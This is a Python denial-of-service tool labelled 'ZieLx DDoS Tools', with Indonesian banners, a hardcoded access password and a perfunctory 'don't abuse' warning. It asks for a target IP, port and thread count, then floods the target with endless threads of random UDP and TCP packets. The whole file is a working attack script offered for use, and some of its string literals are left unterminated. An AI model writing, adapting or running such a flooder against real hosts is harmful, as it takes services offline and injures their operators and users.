#decode by ryhs
import random
import socket
import threading
import os
import sys
import time
from time import sleep

os.system("clear")
password ="zielx"

for i in range(3):
	pwd = input("[•] PASSWORD: ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[•] WAIT FOR 5 SECONDS!!! ")
		break
	else:
		time.sleep(5)
		print("[×] WRONG PASSWORD!!! ")
		continue
time.sleep(5)
print("{} Your Account Ha Been Accepted! \033[92mZIELXXX\033[0m ")
time.sleep(5)
os.system("clear")
print("\u001b[31m{} Baca Dulu Goblog!")
print("""\u001b[31m
|              WARNING!!!!               |
|                                        |
|DDoS merupakan hal ilegal,perlu di ingat|
|DDoS hanya dilakukan jika pemilik server|
|Melakukan kesalahan terhadap kalian     |
|Jadi jangan kalian DDoS server server   |
|Kecil, jadi Don't abuse                 |
time.sleep(5)
os.system("clear")
print(""
    TOOLS BY ZIELXXX || PLEASE DON'T ABUSE !!!


\033[0m 
                
                
                
                
               

\033[92m========= ZieLx DDoS Tools =========
>> Author : ZieLx
>>> Coded : ZieLx
>>>> Discord Comunity : https://discord.gg/treax""")
ip = str(input("[+] Ip Target : "))
port = int(input("[-] Port Target : "))
choice = str(input("[+] Ready?? (ddos/n) : "))
times = int(input("[-] Times : "))
threads = int(input("[+] Threads : "))
os.system("clear")
def ddos():
	data = random._urandom(1024)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")

def ddos2():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] Error!KO!KO!KOK1ko1xuxaw")

def ddos3():
	data = random._urandom(1025)
	i = random.choice(("[•]","[•]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m  {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\033[92m [!] MT KAH MANISZZZ?")

for y in range(threads):
	if choice == 'ddos':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	else:
	    th = threading.Thread(target = ddos3)
	    th.start()
